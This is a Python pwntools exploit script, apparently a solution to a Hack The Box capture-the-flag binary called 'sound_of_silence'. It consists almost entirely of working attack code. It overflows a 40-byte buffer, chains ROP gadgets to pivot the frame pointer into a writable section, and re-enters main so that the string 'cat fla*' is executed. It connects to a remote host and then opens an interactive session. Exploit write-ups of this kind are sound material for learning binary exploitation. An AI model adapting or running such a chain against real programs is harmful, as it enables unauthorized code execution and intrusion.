from pwn import *

gs = '''
break *main+22
continue
'''

elf = context.binary = ELF("./sound_of_silence")

def start():
    if args.REMOTE:
        return remote("94.237.59.63", 48730)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

offset = 40

rop = ROP(elf)

ret = rop.find_gadget(['ret'])[0]

pop_rbp = rop.find_gadget(['pop rbp', 'ret'])[0]

"""
payload = b"".join([
    b"A"*offset,
    p64(ret),
    p64(elf.sym.main)
])
"""

# Direccion de escritura random
# No cualquiera por cierto! xD
# 0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /home/diegojoel301/HTB_Challengues_Repo/pwn_sound_of_silence/pwn_sound_of_silence/challenge/sound_of_silence
addr_to_write = 0x404000 + (0x8*10)

payload = b"".join([
    b"cat fla*".ljust(offset, b"\x00"),
    p64(pop_rbp),
    p64(addr_to_write + 0x8),
    #p64(elf.sym.main+27) # lea rax,[rbp-0x20]
    p64(elf.sym.main+19)
])

#"""
io.sendlineafter(">> ", payload)

payload = b"".join([
    #p64(0x4242424242424242),
    #b"\x00"*32,
    b"A".ljust(40, b"\x00"),
    p64(ret),
    p64(elf.sym.main + 12)

])

io.sendline(payload)
#"""
io.interactive()
